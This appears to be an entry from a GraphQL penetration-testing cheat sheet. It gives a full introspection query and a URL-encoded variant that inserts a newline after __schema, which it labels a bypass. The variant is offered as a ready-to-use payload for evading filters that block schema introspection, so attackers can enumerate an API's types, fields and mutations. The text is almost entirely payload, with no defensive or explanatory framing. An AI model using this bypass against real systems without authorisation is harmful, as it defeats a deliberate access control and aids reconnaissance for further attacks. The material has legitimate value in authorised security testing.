
- Introspection : 
```sql
{
"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"
}
```


- Bypass with the return(__shema && __type) :
```sh
query%7b__schema%0a%7bqueryType%7bname%7dmutationType%7bname%7dsubscriptionType%7bname%7dtypes%7b...FullType%7ddirectives%7bname%20description%20locations%20args%7b...InputValue%7d%7d%7d%7dfragment%20FullType%20on%20__Type%7bkind%20name%20description%20fields(includeDeprecated%3atrue)%7bname%20description%20args%7b...InputValue%7dtype%7b...TypeRef%7disDeprecated%20deprecationReason%7dinputFields%7b...InputValue%7dinterfaces%7b...TypeRef%7denumValues(includeDeprecated%3atrue)%7bname%20description%20isDeprecated%20deprecationReason%7dpossibleTypes%7b...TypeRef%7d%7dfragment%20InputValue%20on%20__InputValue%7bname%20description%20type%7b...TypeRef%7ddefaultValue%7dfragment%20TypeRef%20on%20__Type%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%20ofType%7bkind%20name%7d%7d%7d%7d%7d%7d%7d%7d
```


